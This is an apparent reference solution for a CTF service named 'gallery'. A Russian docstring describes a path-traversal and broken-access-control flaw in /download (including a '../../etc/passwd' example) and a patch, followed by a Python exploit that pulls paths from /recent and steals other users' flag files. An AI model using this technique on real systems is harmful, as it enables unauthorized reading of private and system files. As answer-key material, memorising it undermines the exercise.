"""ЭТАЛОН: gallery — path traversal / broken access control в /download.

Уязвимость: /recent (без авторизации) отдаёт пути хранения последних загрузок
в виде "<token16>/<name>". /download?path=... (тоже без авторизации) открывает
os.path.join(DATA, path) БЕЗ ограничения каталогом пользователя и без проверки
владельца, поэтому любой такой путь — а также выход вверх вида "../<чужой>/<name>"
или "../../etc/passwd" — читается кем угодно. Берём пути из /recent и качаем
чужие файлы с флагами, никаких учёток не нужно.

Эксплойт: GET /recent -> для каждого пути GET /download?path=<путь> -> из
content вытаскиваем флаги регекспом [A-Z0-9]{31}=.

Патч (services/gallery/app.py, download): требовать авторизацию и ограничить
путь каталогом владельца, напр. читать только
    os.path.join(userdir(tok), os.path.basename(path))
(или вовсе убрать /download — есть безопасный /get/<name>). SLA (upload -> /get)
при этом не ломается.
"""
import re
import requests

SERVICE = "gallery"
FLAG = re.compile(r"[A-Z0-9]{31}=")


def exploit(host, port) -> list[str]:
    base = f"http://{host}:{port}"
    try:
        r = requests.get(f"{base}/recent", timeout=4)
        items = r.json().get("items", [])
    except (requests.RequestException, ValueError):
        return []
    flags = []
    for it in items:
        p = (it or {}).get("path")
        if not p:
            continue
        try:
            d = requests.get(f"{base}/download", params={"path": p}, timeout=4)
            content = d.json().get("content", "") or ""
        except (requests.RequestException, ValueError):
            continue
        flags += FLAG.findall(content)
    return flags
